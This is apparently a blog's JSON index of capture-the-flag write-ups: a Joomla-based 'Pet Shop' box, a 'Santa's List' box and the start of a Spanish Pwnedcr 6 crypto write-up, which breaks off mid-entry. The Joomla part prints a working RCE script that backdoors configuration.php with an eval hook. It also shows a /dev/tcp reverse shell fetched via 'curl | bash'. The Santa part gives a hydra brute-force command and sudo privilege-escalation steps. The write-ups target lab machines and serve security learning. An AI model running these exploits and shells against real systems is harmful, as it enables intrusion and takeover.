        "content": "<p><img src=\"/assets/img/petShop/1.png\" width=\"800\" /></p>\n\n<p><a href=\"https://parrot-ctfs.com/\">🦜 Parrot CTFs</a> is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.</p>\n\n<p>This is an easy difficulty machine that exploits a legacy Joomla Content Management System (CMS) and a binary that has SUID permissions to gain root privileges.</p>\n\n<h1 id=\"content\">Content:</h1>\n\n<ul>\n  <li><a href=\"#enumeration-\">Enumeration</a></li>\n  <li><a href=\"#easy-way-%EF%B8%8F\">Easy way</a></li>\n  <li><a href=\"#not-too-easy-way-%EF%B8%8F\">Not too easy way</a></li>\n  <li><a href=\"#privilege-escalation-\">Privilege escalation</a></li>\n</ul>\n\n<h1 id=\"enumeration-\">Enumeration 🔎:</h1>\n\n<p>We start by using <code class=\"language-plaintext highlighter-rouge\">ping</code> to check the TTL of the machine to determine the OS we are dealing with.</p>\n\n<p><img src=\"/assets/img/petShop/2.png\" width=\"600\" /></p>\n\n<p>Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href=\"https://ostechnix.com/identify-operating-system-ttl-ping/\">Identify OS using TTL value</a>.</p>\n\n<p>Now, let’s go with an nmap scan to view the open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.65 -oN allPorts</code></p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-p-</code> –&gt; We are doing a scan against all 65535 ports to search for open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">--open</code> –&gt; It will only report open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-sS</code> –&gt; It can be performed quickly, scanning thousands of ports per second.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">--min-rate 5000</code> –&gt; It sets the minimum rate of packets sent per second to 5000.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-n</code> –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-v</code> –&gt; It will be verbose in its output.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-Pn</code> –&gt; This option skips the host discovery stage.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-oN</code> –&gt; It will save the output in a file called “allPorts”.</p>\n\n<p>We find out the following open ports:</p>\n\n<p><img src=\"/assets/img/petShop/3.png\" width=\"600\" /></p>\n\n<p>Let’s take a look at what the page has.</p>\n\n<p><img src=\"/assets/img/petShop/4.png\" width=\"600\" /></p>\n\n<p>We can see some posts and a user joomla who wrote the posts.</p>\n\n<p>Let’s use <a>Wappalyzer</a> to detect more information about what tecnologies the page is using.</p>\n\n<p><img src=\"/assets/img/petShop/5.png\" width=\"400\" /></p>\n\n<p>We can see that the Content Management System (CMS) is Joomla, what is a for publishing web content like WordPress and others. Now that we know the CMS, we can search for any administration panel and try default creds. Maybe we have luck :), a quick search in Google show us that the directory for the admin panel is <a>/administrator</a>. We can try to view it going to: <code class=\"language-plaintext highlighter-rouge\">http://10.14.0.65/joomla/administrator</code></p>\n\n<p><img src=\"/assets/img/petShop/6.png\" width=\"400\" /></p>\n\n<p>By default, the username is <code class=\"language-plaintext highlighter-rouge\">admin</code> and the password must be defined in the installation progress. We can try login with the user that we find earlier: “<code class=\"language-plaintext highlighter-rouge\">joomla:joomla</code>” but it doesn’t work, so… lets put this aside and continue doing other things.</p>\n\n<p>We can use <a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla\">HackTricks</a> to search for commons ways to enumerate joomla and try to exploit it, first lets try to search the version.</p>\n\n<p><img src=\"/assets/img/petShop/7.png\" width=\"600\" /></p>\n\n<p>Going to the directory <code class=\"language-plaintext highlighter-rouge\">/language/en-GB/en-GB.xml</code> we can see the version of the CMS, now let’s search for public exploits for this version.</p>\n\n<p><img src=\"/assets/img/petShop/8.png\" width=\"600\" /></p>\n\n<p>We can use <code class=\"language-plaintext highlighter-rouge\">searchsploit</code> to search for exploits and we can find a lot :)</p>\n\n<p>There are various ways to solve the machine, an easy one and a not-too-easy one. Let’s first look at the easy way.</p>\n\n<p><img src=\"/assets/img/petShop/9.png\" width=\"600\" /></p>\n\n<h1 id=\"easy-way-️\">Easy way 🛣️:</h1>\n\n<p>Let’s do more enumeration. We can use <a>wfuzz</a> to do fuzzing in the page.</p>\n\n<p><img src=\"/assets/img/petShop/10.png\" width=\"600\" /></p>\n\n<p>We can inspect these directories one by one. We can find that some of them have directory listing capabilities, but we cannot find any useful information…</p>\n\n<p>Ok mmm… Let’s fuzz for file extensions such as backup files: <code class=\"language-plaintext highlighter-rouge\">bak, backup, bck…</code></p>\n\n<p><img src=\"/assets/img/petShop/11.png\" width=\"600\" /></p>\n\n<p>Wow we can see that there is a configuration file configuration.backup. Let’s view its contents.</p>\n\n<p><img src=\"/assets/img/petShop/12.png\" width=\"600\" /></p>\n\n<p>The output is ugly so let’s fix it up. Press <code class=\"language-plaintext highlighter-rouge\">ctrl + u</code> to view the source code. This will make the output a lot prettier, and we can see a username and password. :)</p>\n\n<p><img src=\"/assets/img/petShop/13.png\" width=\"600\" /></p>\n\n<p>Now we can login to the machine with the credentials that we found with: <code class=\"language-plaintext highlighter-rouge\">ssh ron@10.14.0.65</code>, and we are in.</p>\n\n<p><img src=\"/assets/img/petShop/14.png\" width=\"400\" /></p>\n\n<p>Now that we are inside the machine you need to do one thing to ensure smooth operation:</p>\n\n<p>-&gt; <code class=\"language-plaintext highlighter-rouge\">export TERM=xterm</code></p>\n\n<p>This will allow us to clean the screen with <code class=\"language-plaintext highlighter-rouge\">ctrl + l</code>.</p>\n\n<h1 id=\"not-too-easy-way-️\">Not too easy way 🛣️:</h1>\n\n<p>Let’s go back a bit and look the available exploits.</p>\n\n<p><img src=\"/assets/img/petShop/8.png\" width=\"600\" /></p>\n\n<p>In this case, I am going to use the exploit with the title: <code class=\"language-plaintext highlighter-rouge\">3.4.6 - 'configuration.php' Remote Code Execution</code>. You can find all the technical details <a href=\"https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/\">here</a>.</p>\n\n<p>You can use <code class=\"language-plaintext highlighter-rouge\">searchsploit -x php/webapps/47465.py</code> to inspect the source of the exploit, and if you want to copy it to your local directory, you can use: <code class=\"language-plaintext highlighter-rouge\">searchsploit -m php/webapps/47465.py</code>.</p>\n\n<p>If you execute it, it will tell you that it is not vulnerable. However, in reality, it is vulnerable.</p>\n\n<p><img src=\"/assets/img/petShop/15.png\" width=\"600\" /></p>\n\n<p>This is where things get complicated. You need to modify and test the exploit using Burp Suite. If you want to understand how this really works, view the <a href=\"https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/\">technical details</a>. But to keep this write-up from getting too long, I’m going to give you my script to exploit it.</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>#!/bin/python3\n\nimport requests as r, string, random, re, signal, sys\nfrom bs4 import BeautifulSoup\n\nurl = \"http://10.14.0.65/joomla/\"\n#PROXS = {\"http\":\"http://127.0.0.1:8080\"}\nPROXS = {}\n\ndef def_handler(sig, num):\n\tprint(\"\\n\\nSaliendo...\\n\")\n\tsys.exit(1)\n\nsignal.signal(signal.SIGINT, def_handler)\n\ndef random_string(stringLength):\n    letters = string.ascii_lowercase\n    return ''.join(random.choice(letters) for i in range(stringLength))\n\ndef get_backdoor_pay(): # This payload will backdoor the the configuration .PHP with an eval on POST request\n\tfunction = 'assert'\n\ttemplate = 's:3:\"FmF\";O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\\\0\\\\0\\\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\\\0\\\\0\\\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:FUNC_LEN:\"FUNC_NAME\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:LENGTH:\"PAYLOAD\";}i:1;s:4:\"init\";}}s:13:\"\\\\0\\\\0\\\\0connection\";i:1;}'\n\tpayload =  'file_put_contents(\\'configuration.php\\',\\'if(isset($_POST[\\\\\\'' + backdoor_param +'\\\\\\'])) eval($_POST[\\\\\\''+backdoor_param+'\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';'\n\tfunction_len = len(function)\n\tfinal = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))\n\treturn final\n\ndef request(url, payload):\n\ts = r.Session()\n\tpage = s.get(url + 'index.php/login')\n\tsoup = BeautifulSoup(page.content, \"html.parser\")\n\n\tvalues = soup.find_all(\"input\")\n\n\tcsrf = values[-1] # Gets the CSRF token value\n\tok = re.findall('name=\"(.*?)\"', str(csrf))\n\tcsrf = ok[0]\n\turl = url + 'index.php/login?task=user.login'\n\n\treturn_value = values[-2] # Gets the return value\n\tok = re.findall('value=\"(.*?)\"', str(return_value))\n\treturn_value = ok[0]\n\n\tuser_payload = '\\\\0\\\\0\\\\0' * 9\n\tinj_object = '\";'\n\tinj_object += payload\n\tinj_object += 's:6:\"return\";s:102:' # end the object with the 'return' part\n\tpassword_payload = 'AAA' + inj_object\n\n\tdata = {\n\t\t'username':user_payload,\n\t\t'password':password_payload,\n\t\t'return':return_value,\n\t\tcsrf:'1'\n\t}\n\n\ts.post(url, proxies=PROXS, data=data)\n\ndef ping_backdoor(url, param_name):\n\twhile True:\n\t\tcommand = input(\"[RCE]~&gt; \")\n\t\tres = r.post(url + 'configuration.php', data={param_name:'system(\\''+ command +'\\');'}) # Here is where the magic happens\n\t\tprint(res.text)\n\nif __name__ == '__main__':\n\tbackdoor_param = random_string(50) ## Generate a unique string for our payload\n\tpayload = get_backdoor_pay()\n\tprint(\"[+] Backdoor id: \" + backdoor_param)\n\trequest(url, payload)\n\tprint(\"[+] Backdoor is ready, you can enter now...\\n\")\n\tping_backdoor(url, backdoor_param)\n</code></pre></div></div>\n\n<p>Now with this, we can execute commands, but this is NOT a full interactive shell yet.</p>\n\n<p><img src=\"/assets/img/petShop/16.png\" width=\"600\" /></p>\n\n<p>To get an interactive shell, there are a lot of ways to do it, but I’m going to use this one:</p>\n\n<p>Create a file with the name <code class=\"language-plaintext highlighter-rouge\">index.html</code>, with this content:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>bash -i &gt;&amp; /dev/tcp/YOUR_IP_HERE/443 0&gt;&amp;1\n</code></pre></div></div>\n\n<p>Now use the command: <code class=\"language-plaintext highlighter-rouge\">sudo python3 -m http.server 80</code> to put a http server where we are sharing our files.</p>\n\n<p>And finally use the command <code class=\"language-plaintext highlighter-rouge\">nc -lvnp 443</code> to listen for our reverse connection from our payload above.</p>\n\n<p>Now execute the command: <code class=\"language-plaintext highlighter-rouge\">curl YOUR_IP_HERE | bash</code> this is going to get the content of the file index.html and interpret the content as a bash command.</p>\n\n<p><img src=\"/assets/img/petShop/17.png\" width=\"600\" /></p>\n\n<p>We can see that we get a shell like <code class=\"language-plaintext highlighter-rouge\">www-data</code> user.</p>\n\n<p>Now that we are inside the machine you need to do various things to ensure smooth operation:</p>\n\n<ol>\n  <li>-&gt; <code class=\"language-plaintext highlighter-rouge\">script /dev/null -c bash</code></li>\n  <li>-&gt; <code class=\"language-plaintext highlighter-rouge\">ctrl + z</code></li>\n  <li>-&gt; <code class=\"language-plaintext highlighter-rouge\">stty raw -echo; fg</code></li>\n  <li>-&gt; <code class=\"language-plaintext highlighter-rouge\">reset xterm</code></li>\n  <li>-&gt; <code class=\"language-plaintext highlighter-rouge\">export TERM=xterm</code></li>\n</ol>\n\n<p>This will allow us to clean the screen with <code class=\"language-plaintext highlighter-rouge\">ctrl + l</code> and if we do <code class=\"language-plaintext highlighter-rouge\">ctrl + c</code> is not going to kill the shell, more info <a href=\"https://invertebr4do.github.io/tratamiento-de-tty/#\">here</a>.</p>\n\n<p><img src=\"/assets/img/petShop/18.png\" width=\"600\" /></p>\n\n<p>We can see the <code class=\"language-plaintext highlighter-rouge\">configuration.backup</code> file so here we can get the creds of the user ron and we can connect through SSH.</p>\n\n<h1 id=\"privilege-escalation-\">Privilege escalation 🚩:</h1>\n\n<p>Now that we are inside the machine as the user <code class=\"language-plaintext highlighter-rouge\">ron</code>, we need to enumerate the system to find a way to escalate privileges.</p>\n\n<p>One thing I always check first is <code class=\"language-plaintext highlighter-rouge\">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the <code class=\"language-plaintext highlighter-rouge\">root</code> user.</p>\n\n<p>More info about privilege escalation techniques check <a href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation\">here</a>.</p>\n\n<p><img src=\"/assets/img/petShop/19.png\" width=\"600\" /></p>\n\n<p>We can see something interesting, the binary <a>php</a> can be run as the root user.</p>\n\n<p>A quick search in Google tells us that we can escalate privileges with it, search in <a href=\"https://gtfobins.github.io/gtfobins/php/#suid\">GTFOBins</a>.</p>\n\n<p><img src=\"/assets/img/petShop/20.png\" width=\"600\" /></p>\n\n<p>We execute the commands:</p>\n\n<p><img src=\"/assets/img/petShop/21.png\" width=\"600\" /></p>\n\n<p>And now we are root :)</p>\n\n<p>Hope you like it and learn something new :)</p>\n\n"
      } ,
    
      {
        "title"    : "Santa&#39;s List",
        "category" : "Parrot-CTF",
        "tags"     : "Parrot-CTF, Easy",
        "url"      : "/parrot-ctf/Santa's-list",
        "date"     : "2023-08-30 00:00:00 -0500",
        "content": "<p><img src=\"/assets/img/santa-list/1.jpg\" width=\"800\" /></p>\n\n<p><a href=\"https://parrot-ctfs.com/\">🦜 Parrot CTFs</a> is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.</p>\n\n<h1 id=\"content\">Content:</h1>\n\n<ul>\n  <li><a href=\"#enumeration-\">Enumeration</a></li>\n  <li><a href=\"#initial-access-\">Initial access</a></li>\n  <li><a href=\"#privilege-escalation-\">Privilege escalation</a></li>\n</ul>\n\n<h1 id=\"enumeration-\">Enumeration 🔎:</h1>\n\n<p>We start by using <code class=\"language-plaintext highlighter-rouge\">ping</code> to check the TTL of the machine to determine the OS we are dealing with.</p>\n\n<p><img src=\"/assets/img/santa-list/2.png\" width=\"600\" /></p>\n\n<p>Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href=\"https://ostechnix.com/identify-operating-system-ttl-ping/\">Identify OS using TTL value</a>.</p>\n\n<p>Now, let’s go with an nmap scan to view the open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.9 -oN allPorts</code></p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-p-</code> –&gt; We are doing a scan against all 65535 ports to search for open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">--open</code> –&gt; It will only report open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-sS</code> –&gt; It can be performed quickly, scanning thousands of ports per second.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">--min-rate 5000</code> –&gt; It sets the minimum rate of packets sent per second to 5000.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-n</code> –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-v</code> –&gt; It will be verbose in its output.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-Pn</code> –&gt; This option skips the host discovery stage.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-oN</code> –&gt; It will save the output in a file called “allPorts”.</p>\n\n<p>We find out the following open ports:</p>\n\n<p><img src=\"/assets/img/santa-list/3.png\" width=\"250\" /></p>\n\n<p>Let’s take a look at what the page has.</p>\n\n<p><img src=\"/assets/img/santa-list/4.png\" width=\"600\" /></p>\n\n<p>We can see a login panel that has some information that we can use. The login panel says <code class=\"language-plaintext highlighter-rouge\">Santa's administration panel</code>, so maybe a valid username can be <code class=\"language-plaintext highlighter-rouge\">santa</code>.</p>\n\n<h1 id=\"initial-access-\">Initial access 🔑:</h1>\n\n<p>We can try common credentials like <code class=\"language-plaintext highlighter-rouge\">admin:admin</code> or <code class=\"language-plaintext highlighter-rouge\">root:root</code> and many others… But let’s try with the information that we have <code class=\"language-plaintext highlighter-rouge\">santa:santa</code>, <code class=\"language-plaintext highlighter-rouge\">santa:admin</code> or <code class=\"language-plaintext highlighter-rouge\">santa:northpole</code> and with those credentials, we can gain access…</p>\n\n<p>But let’s try other ways rather than guessing. For example, we can use the tool cewl to create a wordlist based on the content of the page.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">cewl http://10.14.0.9/ --lowercase -w wordlist.txt</code></p>\n\n<p><img src=\"/assets/img/santa-list/5.png\" width=\"600\" /></p>\n\n<p>We can use the tool <a>cupp</a> to generate different variations of words.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">./cupp -w wordlist.txt</code> –&gt; We pass the wordlist that we created with <a>cewl</a>.</p>\n\n<p><img src=\"/assets/img/santa-list/6.png\" width=\"600\" /></p>\n\n<p>The content of the <code class=\"language-plaintext highlighter-rouge\">wordlist.txt.cupp.txt</code> file generated by cupp is as follows:</p>\n\n<p><img src=\"/assets/img/santa-list/7.png\" width=\"600\" /></p>\n\n<p>We can see that it generates a lot of variations.</p>\n\n<p>Now let’s do a bruteforce attack with the use of wordlist that we have and let’s try with the username <code class=\"language-plaintext highlighter-rouge\">santa</code>.</p>\n\n<p>There are many ways to complete a bruteforce attack. We will use the tool <a>hydra</a> in this case.</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>hydra -l santa -P wordlist.txt.cupp.txt 10.14.0.9 http-post-form \"/index.php:username=santa&amp;password=^PASS^:Incorrect login\" -v\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/santa-list/8.png\" width=\"700\" /></p>\n\n<p>And the correct credentials are <a>santa:northpole</a>.</p>\n\n<p><img src=\"/assets/img/santa-list/9.png\" width=\"600\" /></p>\n\n<p>We are in and we can see a button to download a file.</p>\n\n<p><img src=\"/assets/img/santa-list/10.png\" width=\"600\" /></p>\n\n<p>We can see a new username: <a>elf-manager</a>. Maybe we can use it to login with SSH.</p>\n\n<p>But let’s first decrypt the MD5 hashes with <a href=\"https://md5decrypt.net/en/\">md5decrypt.net</a>.</p>\n\n<p><img src=\"/assets/img/santa-list/11.png\" width=\"600\" /></p>\n\n<p>What if we try reusing the password <code class=\"language-plaintext highlighter-rouge\">northpole</code> with the username <code class=\"language-plaintext highlighter-rouge\">elf-manager</code>? We can try to connect to SSH and see if we can get in.</p>\n\n<p><img src=\"/assets/img/santa-list/12.png\" width=\"600\" /></p>\n\n<p>It works 🎉. Now that we are inside the machine you need to do some things to ensure smooth operation:</p>\n\n<ol>\n  <li><code class=\"language-plaintext highlighter-rouge\">export TERM=xterm</code></li>\n</ol>\n\n<p>This will allow us to clean the screen with <code class=\"language-plaintext highlighter-rouge\">ctrl + l</code>.</p>\n\n<p>Now we can see the flag 🎉.</p>\n\n<h1 id=\"privilege-escalation-\">Privilege escalation 🚩:</h1>\n\n<p>We need to enumerate the system to find a way to escalate privileges.</p>\n\n<p>One thing I always check first is <a>sudo -l</a>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.</p>\n\n<p>More info about privilege escalation techniques check <a href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation\">here</a>.</p>\n\n<p><img src=\"/assets/img/santa-list/13.png\" width=\"600\" /></p>\n\n<p>We can execute vim command as the root user. We can see in <a href=\"https://gtfobins.github.io/gtfobins/vim/\">GTFOBins</a> for a way to escalate privileges.</p>\n\n<p>Or we can do it this way:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sudo vim\n\nesc + : + !bash --&gt; This is to spawn a shell as root user.\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/santa-list/14.png\" width=\"100\" /></p>\n\n<p>And now we are root :)</p>\n\n<p><img src=\"/assets/img/santa-list/15.png\" width=\"300\" /></p>\n\n<p>Hope you like it and learn something new :)</p>\n"
      } ,
    
      {
        "title"    : "Pwnedcr 6",
        "category" : "Pwnedcr",
        "tags"     : "Pwnedcr6, Easy",
        "url"      : "/pwnedcr/Pwnedcr-6",
        "date"     : "2023-11-15 00:00:00 -0600",
        "content": "<p><img src=\"/assets/img/pwnedcr6/1.png\" width=\"800\" /></p>\n\n<h1 id=\"retos\">Retos:</h1>\n\n<table>\n  <thead>\n    <tr>\n      <th style=\"text-align: center\">crypto</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#1-800-00-hack\">800-00-hack</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#2-too-easy\">too easy</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#3-dcod-hit\">dcod’hit!</a></td>\n    </tr>\n  </tbody>\n</table>\n\n<hr />\n\n<table>\n  <thead>\n    <tr>\n      <th style=\"text-align: center\">OSINT</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#1-in-flames\">In flames!!</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#2-ob\">OB</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#3-they-seem-but-they-are-not\">They seem but they are not!</a></td>\n    </tr>\n  </tbody>\n</table>\n\n<hr />\n\n<table>\n  <thead>\n    <tr>\n      <th style=\"text-align: center\">Reversing</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#1-j-guy\">J-GUY</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#2-idk\">IDK</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#3-cr4zzy-byt3s\">Cr4zzy Byt3s</a></td>\n    </tr>\n  </tbody>\n</table>\n\n<hr />\n\n<table>\n  <thead>\n    <tr>\n      <th style=\"text-align: center\">Stego</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#1-rocinante\">Rocinante!!</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#2-frk-of-pil\">F*rk of PIL</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#3-welcome-sloth\">welcome Sloth!!</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#4-rollon\">RollON</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#5-b3tch\">B3tch</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#6-relajasonic\">Relajasonic</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#7-hack--eat-pinto\">Hack &amp; Eat Pinto!</a></td>\n    </tr>\n  </tbody>\n</table>\n\n<hr />\n\n<table>\n  <thead>\n    <tr>\n      <th style=\"text-align: center\">Web</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#1-ellingson-mineral-chapter-1\">Ellingson Mineral Chapter 1</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#2-ellingson-mineral-chapter-2\">Ellingson Mineral Chapter 2</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"#3-ellingson-mineral-chapter-3\">Ellingson Mineral Chapter 3</a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center\"><a href=\"/assets/img/pwnedcr6/vaca-loca.gif\">Ellingson Mineral Chapter 4 (La vaca loca)</a></td>\n    </tr>\n  </tbody>\n</table>\n\n<hr />\n\n<h1 id=\"crypto\">Crypto:</h1>\n\n<h3 id=\"1-800-00-hack\">1. 800-00-hack:</h3>\n\n<blockquote>\n  <p>Descripción: We can hacker with our ears.</p>\n</blockquote>\n\n<p>Nos proporcionan <a href=\"/assets/img/pwnedcr6/800-PWND.wav\">este archivo</a> de audio en el cual se escuchan los tonos que se generan al marcar un número de teléfono, lo que se conoce como <strong>Dual-tone multi-frequency signaling</strong>. Buscando un poco, podemos dar con <a href=\"https://dtmf.netlify.app/\">este recurso</a>, el cual nos permite decodificar el archivo de audio a números.</p>\n\n<p>El resultado es el siguiente:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>4433277708666044222255\n</code></pre></div></div>\n\n<p>Una vez que tenemos estos números, podemos utilizar este <a href=\"https://www.dcode.fr/multitap-abc-cipher\">otro recurso</a> el cual nos permitirá obtener un resultado en texto claro.</p>\n\n<p>Nos da esta cadena en texto claro:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>HEAR TO/TMN HACK\n</code></pre></div></div>\n\n<p>Por lo cual podemos llegar a la conclusion de que la flag es la siguiente:</p>\n\n<blockquote>\n  <p>PWND{hear_to_hack}</p>\n</blockquote>\n\n<h3 id=\"2-too-easy\">2. too easy:</h3>\n\n<blockquote>\n  <p>Descripción: Some cipher methods require two elements, has anyone found my keys?</p>\n</blockquote>\n\n<p>Nos proporcionan un archivo que al parecer fue en cifrado. El contenido es el siguiente:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>tvkjxtui, at uvojkkuis wg cwh lkjbtfcj ltigelt wg ci uhtkiaxbr lt lwj kdgviwaxu. dicmgebt tekcpekqish, cgztgfv g sbxzézixvv ltlezngtpuw tlvv utgurrt. ¡uwvvp lwvzix!!!rnvs{e00m_rzdnpu_&amp;_l3rkagb}\n</code></pre></div></div>\n\n<p>Para desafíos de este estilo, tu mejor amigo es usar <a href=\"https://gchq.github.io/CyberChef/\">CyberChef</a>. Por experiencia supe que este tipo de cifrado era <a href=\"https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher\">Vigenère</a>. Una forma de determinar el tipo de cifrado es utilizando <a href=\"https://www.boxentriq.com/code-breaking/cipher-identifier\">esta pagina</a>.</p>\n\n<p>Este cifrado nos pide una clave para poder ver el texto, podemos probar con el nombre del archivo de donde proviene este texto, que es: <code class=\"language-plaintext highlighter-rouge\">cript</code>, y en efecto podemos ver el siguiente resultado.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/2.png\" width=\"600\" /></p>\n\n<blockquote>\n  <p>pwnd{l00k_around_&amp;_d3crypt}</p>\n</blockquote>\n\n<h3 id=\"3-dcod-hit\">3. dcod hit!:</h3>\n\n<blockquote>\n  <p>Descripción: I thought I understood encoding but everything looks backwards…</p>\n</blockquote>\n\n<p>Nos un archivo que contiene lo siguiente:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>a056e646a006a0d3c26455e24375d2e4b3755295a37392d4e2730465a26552153342c225a362c2b443748225c2354506a0d483735494d23392c4e373d255d36394d2c244d4a523735492a3739254936354c23375830533629203a3754225537252050355928463635424d3331373a0d423654285a3325394e362554503451445d243d213a332d3f28374445503551495d2735223c34354545363457543659295c3755263e343c425c2735234a0d4b3731254437593c25345941533629253a3435554d2630545a3545215e26254f2d363d295c3635434c27414c4d245c315d3429455136454a2835354a5a0d4336595054345d3553352c325c3325325236494c2c274d2e4b3359395a375062553735314d3441494c37253a3c3545473837354051375d2d4c33493a5a0d42345d3e423349393c3341325337392a2c34393a5e2624205d343954323730345c26492c48344d543c37252e433659535e363d5958344d265e3434475a0d4c3639572e3449472e2730445835392a4b355d324c375d2554363540513459525b3755235e3539472c27252f4b2455595d243d4c2e34415b2833452c2a0d4c3349394e3724345436552b463749403b3335314436455b21342d5a42345d223a3455455937593b2c2645525d2725313c2750365033554148373d3b4a026567696e60263434302d2\n</code></pre></div></div>\n\n<p>Como mencioné anteriormente, tu mejor aliado es <a href=\"https://gchq.github.io/CyberChef/\">CyberChef</a>. En la descripción, nos dan una pista ‘<strong>backwards</strong>’, tal vez el texto esta invertido entonces invirtiéndolo otra vez talvez consigamos algo.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/3.png\" width=\"600\" /></p>\n\n<p>El símbolo de la varita mágica indica que CyberChef ha encontrado una coincidencia con un cifrado.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/4.png\" width=\"600\" /></p>\n\n<p>CyberChef reconoció que era un texto en hexadecimal, y podemos probar invirtiéndolo nuevamente. Ahora observamos un texto más claro en el cual podemos trabajar, Pero parece estar mal acomodado, así que intentemos acomodarlo de esta manera.</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>begin 644 